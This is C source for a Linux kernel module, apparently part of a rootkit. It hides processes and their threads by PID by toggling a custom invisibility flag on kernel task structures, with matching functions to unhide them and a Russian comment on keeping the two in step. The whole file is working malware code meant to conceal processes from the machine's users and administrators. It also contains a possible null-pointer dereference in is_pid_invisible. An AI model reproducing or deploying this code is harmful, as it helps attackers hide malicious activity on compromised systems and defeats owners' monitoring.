#include "../inc/process.h"

struct task_struct *find_process(int pid){
    struct task_struct *p = current;
    for_each_process(p){
        if (p->pid == pid){
            return p;
        }
    }
    return NULL;
}

void switch_task_visability(struct task_struct *task){
    task->flags ^= PF_INVISIBLE;
}
int is_process_invisible(struct task_struct *proc){
    return (proc->flags & PF_INVISIBLE);
}
int is_pid_invisible(pid_t pid) {
    if (!pid)
        return 0;
    return is_process_invisible(find_process(pid));
}


int hide_process(int pid){
    printk(KERN_DEBUG "TRY TO HIDE PROCESS");
    if (! pid){
        printk(KERN_DEBUG "BAD PID");
        return EBADPID;
    }
    struct task_struct *proc_to_hide = find_process(pid);
    if (proc_to_hide == NULL){
        printk(KERN_DEBUG "CANT HIDE PROCESS");
        return ENOPROC;
    }
    if (!is_process_invisible(proc_to_hide)){
        switch_task_visability(proc_to_hide);
        return 0;
    }
    printk(KERN_DEBUG "PROCESS ALREADY INVISIBLE");
    return 0;
}
int show_process(int pid){
    printk(KERN_DEBUG "TRY TO SHOW PROCESS");
    if (! pid){
        printk(KERN_DEBUG "BAD PID");
        return EBADPID;
    }
    struct task_struct *proc_to_show = find_process(pid);
    if (proc_to_show == NULL){
        printk(KERN_DEBUG "CANT SHOW PROCESS");
        return ENOPROC;
    }
    if (is_process_invisible(proc_to_show)){
        switch_task_visability(proc_to_show);
        return 0;
    }
    printk(KERN_DEBUG "PROCESS ALREADY VISIBLE");
    return 0;
}
int hide_threads_of_process(int pid){
    printk(KERN_DEBUG "TRY TO HIDE PROCESS THREADS");
    if (! pid){
        printk(KERN_DEBUG "BAD PID");
        return EBADPID;
    }
    struct task_struct *proc_to_hide = find_process(pid);
    struct task_struct *thread_to_hide;
    if (proc_to_hide == NULL){
        printk(KERN_DEBUG "CANT HIDE PROCESS THREADS");
        return ENOPROC;
    }
    for_each_thread(proc_to_hide, thread_to_hide){
        if(proc_to_hide->pid != thread_to_hide->pid){
            switch_task_visability(thread_to_hide);
        }
    }
    printk(KERN_DEBUG "SUCCESSFULLY HID THREADS");
    return 0;
}
//строго вместе с show_process, иначе может быть так, что процесс видимый, а треды - нет. И наоборот
int show_threads_of_process(int pid){
    printk(KERN_DEBUG "TRY TO SHOW PROCESS THREADS");
    if (! pid){
        printk(KERN_DEBUG "BAD PID");
        return EBADPID;
    }
    struct task_struct *proc_to_show = find_process(pid);
    struct task_struct *thread_to_show;
    if (proc_to_show == NULL){
        printk(KERN_DEBUG "CANT SHOW PROCESS THREADS");
        return ENOPROC;
    }
    for_each_thread(proc_to_show, thread_to_show){
        if(proc_to_show->pid != thread_to_show->pid){
            switch_task_visability(thread_to_show);
        }
    }
    printk(KERN_DEBUG "SUCCESSFULLY SHOW THREADS");
    return 0;
}


void hide_full_process(int pid){
    
    int ret = hide_process(pid);
    if (ret != 0){
        return;
    }
    hide_threads_of_process(pid);
    printk(KERN_DEBUG "SUCCESSFULLY HIDDEN FULL PROCESS");
}
void show_full_process(int pid){
    
    int ret = show_process(pid);
    if (ret != 0){
        return;
    }
    show_threads_of_process(pid);
    printk(KERN_DEBUG "SUCCESSFULLY SHOWN FULL PROCESS");
}